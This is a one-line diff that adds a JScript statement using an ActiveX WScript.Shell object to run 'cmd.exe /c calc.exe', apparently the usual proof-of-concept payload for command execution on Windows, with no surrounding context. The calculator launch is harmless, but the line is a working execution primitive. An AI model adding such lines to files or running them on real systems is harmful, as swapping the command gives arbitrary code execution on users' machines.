@@ -1,0 +1,1 @@
+new ActiveXObject('WScript.Shell').Run("cmd.exe /c calc.exe");
